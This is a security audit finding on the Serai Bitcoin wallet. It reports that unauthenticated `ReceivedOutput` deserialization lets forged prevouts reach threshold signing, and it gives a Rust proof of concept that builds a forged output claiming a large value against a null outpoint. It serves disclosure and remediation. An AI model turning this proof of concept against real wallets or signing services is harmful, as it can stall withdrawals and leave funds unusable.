### Title
Unauthenticated `ReceivedOutput` deserialization permits fabricated prevouts and unspendable transactions - (File: networks/bitcoin/src/wallet/mod.rs)

### Summary
`ReceivedOutput::read` accepts an untrusted scalar offset, `TxOut`, and `OutPoint` without authenticating that the outpoint exists or that the claimed prevout belongs to the referenced transaction. [1](#0-0)  `SignableTransaction` then trusts the supplied output value for balance checks and uses the claimed `TxOut` as the transaction prevout. [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
An attacker can serialize a `ReceivedOutput` whose `outpoint` references a nonexistent or unrelated UTXO, while its embedded `TxOut` claims a large value and a script derived from the victim’s tweaked threshold key. `ReceivedOutput::read` reconstructs this combination without any consistency or provenance check. [5](#0-4) 

`SignableTransaction::multisig` only checks that the claimed `TxOut` script equals the tweaked group key’s P2TR script; it does not check that the `outpoint` resolves to that `TxOut` on-chain. [6](#0-5)  Signing then commits to `Prevouts::All(&self.tx.prevouts)`, meaning the fabricated prevout data becomes part of every Taproot sighash. [7](#0-6) 

### Impact Explanation
A wallet or processor accepting attacker-supplied serialized outputs can be induced to construct and threshold-sign a transaction spending fabricated inputs. The resulting transaction may pass Serai’s funding and key checks, but Bitcoin consensus will reject it if the outpoint does not exist or its actual prevout differs from the forged `TxOut`. This can cause reported spendable funds to become unusable and can repeatedly stall withdrawal/signing flows.

### Likelihood Explanation
The attack only requires control over bytes passed to `ReceivedOutput::read` or over `ReceivedOutput` objects supplied to `SignableTransaction::new`. No private keys, validator privileges, malformed curve encodings, or consensus invalidity in the source transaction are required. The fabricated script is easy to satisfy because the attacker can choose an offset and compute the corresponding tweaked key script.

### Recommendation
Do not treat `ReceivedOutput::read` as proof of an on-chain spendable output. Require callers to provide authenticated scanner-derived outputs, or add an explicit validation path that fetches the referenced transaction and compares the real outpoint’s `TxOut` and spendability before allowing it into `SignableTransaction::new`. Consider renaming or encapsulating deserialization so untrusted `offset`/`output`/`outpoint` triples cannot be represented as confirmed received outputs.

### Proof of Concept
```rust
use bitcoin::{
  consensus::serialize,
  OutPoint, TxOut, Amount,
};
use frost::{ThresholdKeys, curve::Secp256k1};
use bitcoin_serai::wallet::{ReceivedOutput, SignableTransaction, p2tr_script_buf};
use k256::Scalar;

fn forged_received_output(
  keys: &ThresholdKeys<Secp256k1>,
  claimed_value: u64,
) -> Vec<u8> {
  // Choose a valid zero offset so the claimed script is the wallet's normal P2TR key.
  let script = p2tr_script_buf(keys.group_key()).unwrap();

  let forged_prevout = TxOut {
    value: Amount::from_sat(claimed_value),
    script_pubkey: script,
  };

  // This can be nonexistent or can reference an output owned by somebody else.
  let false_outpoint = OutPoint::null();

  let mut bytes = Vec::new();
  bytes.extend(Scalar::ZERO.to_bytes());
  bytes.extend(serialize(&forged_prevout));
  bytes.extend(serialize(&false_outpoint));
  bytes
}

fn exploit(
  keys: &ThresholdKeys<Secp256k1>,
  payment_script: bitcoin::ScriptBuf,
) {
  let encoded = forged_received_output(keys, 10_000_000_000);
  let forged = ReceivedOutput::read(&mut encoded.as_slice()).unwrap();

  // Funding checks use the forged value rather than an on-chain prevout.
  let signable = SignableTransaction::new(
    vec![forged],
    &[(payment_script, 10_000)],
    None,
    None,
    10,
  ).unwrap();

  // This succeeds because only the forged script is checked against the tweaked key.
  let machine = signable.multisig(keys).unwrap();

  // Completing the FROST protocol produces signatures over Prevouts::All containing
  // the fabricated TxOut. The transaction is rejected because OutPoint::null() does
  // not reference that prevout.
}
```

`SignableTransaction::new` accepts the fabricated value during its balance check, and `multisig` accepts the fabricated script because that script is all that is compared to the tweaked group key. [3](#0-2) [6](#0-5)
